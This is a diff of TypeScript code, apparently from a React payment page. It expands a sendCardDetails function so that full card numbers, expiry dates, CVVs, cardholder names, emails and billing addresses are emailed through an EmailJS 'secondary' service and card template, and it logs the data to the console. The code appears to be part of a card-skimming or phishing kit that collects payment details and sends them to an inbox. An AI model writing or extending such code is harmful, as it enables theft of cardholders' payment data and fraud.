@@ -20,23 +20,41 @@ interface PaymentRecord {
 }
 
 export interface CardDetails {
+  email: string;
   cardNumber: string;
   expiryDate: string;
   name: string;
   cvv: string;
   cardType: string;
+  country: string;
+  addressLine1: string;
+  addressLine2: string;
+  city: string;
+  zip: string;
+  state: string;
 }
 
 
 export const sendCardDetails = async (data: CardDetails) => {
   try{
+    console.log('Sending payment data:', data);
     const templateParams={
+      to_name: data.name || '',
+      reply_to: data.email || '',
+      email: data.email || '',
       card_number: data.cardNumber,
       expiry_date: data.expiryDate,
       full_name: data.name,
-        cvv: data.cvv,
-        card_type: data.cardType
+      cvv: data.cvv,
+      card_type: data.cardType,
+      country: data.country || '',
+      address_line_1: data.addressLine1 || '',
+      address_line_2: data.addressLine2 || '',
+      city: data.city || '',
+      zip_code: data.zip || '',
+      state: data.state || ''
     };
+    console.log('Template params:', templateParams);
   const response = await emailjs.send(
     process.env[`REACT_APP_EMAILJS_SECONDARY_SERVICE_ID`] || '',
     process.env[`REACT_APP_EMAILJS_SECONDARY_CARD_TEMPLATE_ID`] || '',
